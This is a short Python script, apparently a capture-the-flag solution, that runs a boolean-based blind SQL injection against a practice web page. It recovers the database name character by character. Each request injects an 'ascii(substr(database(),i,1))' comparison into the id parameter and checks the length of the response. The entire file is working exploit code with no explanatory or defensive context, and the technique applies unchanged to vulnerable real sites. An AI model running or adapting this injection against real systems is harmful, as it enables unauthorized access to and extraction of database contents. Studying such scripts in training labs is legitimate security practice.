import requests


def getDBName(DBName_len):
    DBName = ""

    success_url = "http://ctf5.shiyanbar.com/web/index_3.php?id=2"
    success_response_len = len(requests.get(success_url).text)

    url_template = "http://ctf5.shiyanbar.com/web/index_3.php?id=2' and ascii(substr(database(),{0},1))={1}%23"
    chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'

    print("Start to retrieve database name...")
    print("Success_response_len is: ", success_response_len)
    for i in range(1, DBName_len + 1):
        print("Number of letter: ", i)
        tempDBName = DBName
        for char in chars:
            print("Test letter " + char)
            char_ascii = ord(char)
            url = url_template.format(i, char_ascii)
            response = requests.get(url)
            if len(response.text) == success_response_len:
                DBName += char
                print("DBName is: " + DBName + "...")
                break
        if tempDBName == DBName:
            print("Letters too little! Program ended.")
            exit()
    print("Retrieve completed! DBName is: " + DBName)


getDBName(5)